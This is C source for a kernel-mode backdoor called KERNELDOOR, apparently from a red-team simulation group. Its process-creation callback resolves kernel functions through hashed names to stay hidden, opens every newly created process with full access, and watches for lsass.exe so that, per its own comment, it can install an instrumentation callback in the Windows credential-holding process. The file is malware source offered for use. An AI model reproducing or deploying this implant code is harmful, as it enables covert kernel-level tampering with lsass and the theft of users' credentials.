/*!
 *
 * KERNELDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( ZwQueryInformationProcess );
	D_API( ExAllocatePool );
	D_API( ZwOpenProcess );
	D_API( ExFreePool );
	D_API( ZwClose );
} API ;

#define H_API_ZWQUERYINFORMATIONPROCESS		0x0abca671 /* ZwQueryInformationProcess */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_ZWOPENPROCESS			0x96d18147 /* ZwOpenProcess */
#define H_API_EXFREEPOOL			0x3f7747de /* ExFreePool */
#define H_STR_LSASSEXE				0x7384117b /* lsass.exe */
#define H_API_ZWCLOSE				0xe391398c /* ZwClose */

/*!
 *
 * Purpose:
 *
 * Checks if Lsa is being created and installs a
 * InstrumentationCallback to be executed when
 * the next system call is run.
 *
!*/
D_SEC( B ) VOID ProcessNotifyRoutine( HANDLE PrId, HANDLE CrId, BOOLEAN Create )
{
	API			Api;
	CLIENT_ID		Cid;
	UNICODE_STRING		Exe;
	OBJECT_ATTRIBUTES	Att;

	SIZE_T			Len = 0;

	PKPCR			Pcr = NULL;
	PTABLE			Tbl = NULL;
	HANDLE			Prc = NULL;
	PUNICODE_STRING		Nam = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Exe, sizeof( Exe ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	/* Get pointer to PCR */
	Tbl = C_PTR( G_PTR( Table ) );
	Pcr = C_PTR( __readgsqword( FIELD_OFFSET( KPCR, Self ) ) );

	/* Is PASSIVE_LEVEL */
	if ( ! Pcr->Irql ) {
		/* Process is being created */
		if ( Create != FALSE ) {
			Api.ZwQueryInformationProcess = PeGetFuncEat( Tbl->KernelBase, H_API_ZWQUERYINFORMATIONPROCESS );
			Api.ExAllocatePool            = PeGetFuncEat( Tbl->KernelBase, H_API_EXALLOCATEPOOL );
			Api.ZwOpenProcess             = PeGetFuncEat( Tbl->KernelBase, H_API_ZWOPENPROCESS );
			Api.ExFreePool                = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );
			Api.ZwClose                   = PeGetFuncEat( Tbl->KernelBase, H_API_ZWCLOSE );

			/* Target the created process */
			Cid.UniqueProcess = C_PTR( CrId );
			Cid.UniqueThread  = C_PTR( NULL );

			/* Initialize the object attributes for the specific process */
			InitializeObjectAttributes( & Att, NULL, OBJ_KERNEL_HANDLE, NULL, NULL );

			/* Open our process so we can determine its name */
			if ( NT_SUCCESS( Api.ZwOpenProcess( & Prc, PROCESS_ALL_ACCESS, & Att, & Cid ) ) ) {
				/* Query the entire size of the buffer needed */
				if ( ! NT_SUCCESS( Api.ZwQueryInformationProcess( Prc, ProcessImageFileName, NULL, 0, & Len ) ) ) {
					/* Allocate the space for the name */
					if ( ( Nam = Api.ExAllocatePool( NonPagedPool, Len ) ) != NULL ) {
						/* Query the name */
						if ( NT_SUCCESS( Api.ZwQueryInformationProcess( Prc, ProcessImageFileName, Nam, Len, & Len ) ) ) {
							/* Extract the executable name from the entire path */
							for ( USHORT Idx = ( Nam->Length / sizeof( WCHAR ) ) - 1 ; Idx != 0 ; --Idx ) {
								/* Has Path Characters */
								if ( Nam->Buffer[ Idx ] == L'\\' || Nam->Buffer[ Idx ] == L'/' ) {
									Exe.Buffer = & Nam->Buffer[ Idx + 1 ];
									Exe.Length = Nam->Length - ( Idx + 1 ) * sizeof( WCHAR );
									Exe.MaximumLength = Nam->MaximumLength - ( Idx + 1 ) * sizeof( WCHAR );
									break;
								};
							};

							/* Is Lsass? */
							if ( HashString( Exe.Buffer, Exe.Length ) == H_STR_LSASSEXE ) {
								/* Have we already been run once? */
								if ( ! InterlockedExchangeAdd( C_PTR( G_PTR( KmEvt ) ), 0 ) ) {
									/* Increment to notify that we have been fired */
									InterlockedIncrement( C_PTR( G_PTR( KmEvt ) ) );
								};
							};
						};
						/* Free UNICODE_STRING */
						Api.ExFreePool( Nam );
					};
				};
				/* Close Handle */
				Api.ZwClose( Prc );
			};
		};
	};
};
